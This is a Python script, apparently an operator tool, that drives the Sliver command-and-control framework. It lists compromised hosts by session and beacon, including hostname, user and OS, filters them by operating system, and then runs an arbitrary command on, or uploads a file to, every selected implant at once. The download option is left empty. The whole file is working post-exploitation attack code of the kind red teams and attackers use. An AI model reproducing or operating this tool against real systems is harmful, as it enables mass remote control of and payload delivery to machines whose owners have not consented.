import os, sys
import asyncio
import argparse
import sliver
from prettytable import PrettyTable
import inquirer
import shlex

CONFIG_DIR = os.path.join(os.path.expanduser("~"), ".sliver-client", "configs")
DEFAULT_CONFIG = os.path.join(CONFIG_DIR, "default.cfg")

parser = argparse.ArgumentParser(description="An script for automating actions against multiple beacons and sessions")
parser.add_argument('--config', type=str, help='Sliver client config file', required=False, default=DEFAULT_CONFIG)
args = parser.parse_args()

async def target_action(action, args):
    if type(action.__self__) == sliver.InteractiveBeacon:
        task = await action(**args)
        return await task
    else:
        return await action(**args)

async def mass_execute(targets, cmd):
    execute_args = {'exe': cmd[0], 'args': cmd[1:] if len(cmd) > 1 else []}
    actions = [target_action(target.execute, execute_args) for target in targets]
    return list(zip([target.remote_address for target in targets], await asyncio.gather(*actions)))

async def mass_upload(targets, remote_path, filename):
    try:
        with open(filename, 'rb') as f:
            upload_args = {'remote_path': remote_path, 'data': f.read()}
            actions = [target_action(target.upload, upload_args) for target in targets]
            return list(zip([target.remote_address for target in targets], await asyncio.gather(*actions)))
    except FileNotFoundError:
        print('[*] ERROR: File does not exist')
        return []

async def get_sessions_beacons(client):
    sessions = await client.sessions()
    beacons = await client.beacons()

    print('[*] Sessions:')
    if len(sessions):
        sessions_table = PrettyTable()
        sessions_table.field_names = ['Session ID', 'Name', 'Remote Address', 'Hostname', 'Username', 'Operating System']
        for session in sessions:
            sessions_table.add_row([session.ID, session.Name, session.RemoteAddress, session.Hostname, session.Username, session.OS])
        print(sessions_table)
    else:
        print('No sessions')
    print()
    print('[*] Beacons:')
    if len(beacons):
        beacons_table = PrettyTable()
        beacons_table.field_names = ['Beacon ID', 'Name', 'Remote Address', 'Hostname', 'Username', 'Operating System']
        for beacon in beacons:
            beacons_table.add_row([beacon.ID, beacon.Name, beacon.RemoteAddress, beacon.Hostname, beacon.Username, beacon.OS])
        print(beacons_table)
    else:
        print('No beacons')
    print()

    return [sessions, beacons]

async def main():
    print(r'''               __               .__  .__                    
_____   __ ___/  |_  ____  _____|  | |__|__  __ ___________ 
\__  \ |  |  \   __\/  _ \/  ___/  | |  \  \/ // __ \_  __ \
 / __ \|  |  /|  | (  <_> )___ \|  |_|  |\   /\  ___/|  | \/
(____  /____/ |__|  \____/____  >____/__| \_/  \___  >__|   
     \/                       \/                   \/       ''' + '\n'*2)
    config = sliver.SliverClientConfig.parse_config_file(args.config)
    client = sliver.SliverClient(config)
    print('[*] Connecting to server...')
    await client.connect()
    print()
    
    sessions, beacons = await get_sessions_beacons(client)
    
    while True:
        questions = [
            inquirer.List(
                'choice',
                message='Choose an action',
                choices=['Attack', 'Check current sessions/beacons', 'Exit']
            )
        ]
        answers = inquirer.prompt(questions)
        match answers['choice']:
            case 'Attack':
                pass
            case 'Check current sessions/beacons':
                sessions, beacons = await get_sessions_beacons(client)
                continue
            case 'Exit':
                sys.exit(0)

        questions = [
            inquirer.List(
                'os',
                message='Select an OS to target',
                choices=['Linux', 'Windows'],
            ),
            inquirer.List(
                'action',
                message='Choose an action',
                choices=['execute', 'upload', 'download']
            )
        ]
        answers = inquirer.prompt(questions)
        
        # Select sessions/beacons by IP address
        targets = []
        for beacon in beacons:
            beacon_address = beacon.RemoteAddress.split(':')[0]
            new = True
            for target in targets:
                if target.remote_address.split(':')[0] == beacon_address:
                    new = False
                    break
            if new and beacon.OS.lower() == answers['os'].lower():
                targets.append(await client.interact_beacon(beacon.ID))
        for session in sessions:
            session_address = session.RemoteAddress.split(':')[0]
            new = True
            for target in targets:
                if target.remote_address.split(':')[0] == session_address:
                    new = False
                    break
            if new and session.OS.lower() == answers['os'].lower():
                targets.append(await client.interact_session(session.ID))
        
        print('[*] TARGETS:')
        [print(target.remote_address) for target in targets]
        print()

        # Perform action
        tasks = []
        match answers['action']:
            case 'execute':
                questions = [
                    inquirer.Text('command', message='Enter a command')
                ]
                options = inquirer.prompt(questions)
                results = await mass_execute(targets, shlex.split(options['command']))
                [print(f'[{result[0]}]\n{result[1].Stdout.decode()}') for result in results]
            case 'upload':
                questions = [
                    inquirer.Text('filename', message='Enter a filename'),
                    inquirer.Text('remote_path', message='Enter a remote path for the file')
                ]
                options = inquirer.prompt(questions)
                results = await mass_upload(targets, options['remote_path'], options['filename'])
                [print(f'[{result[0]}]\nUploaded to:{result[1].Path}') for result in results]
            case 'download':
                results = []


if __name__ == '__main__':
    asyncio.run(main())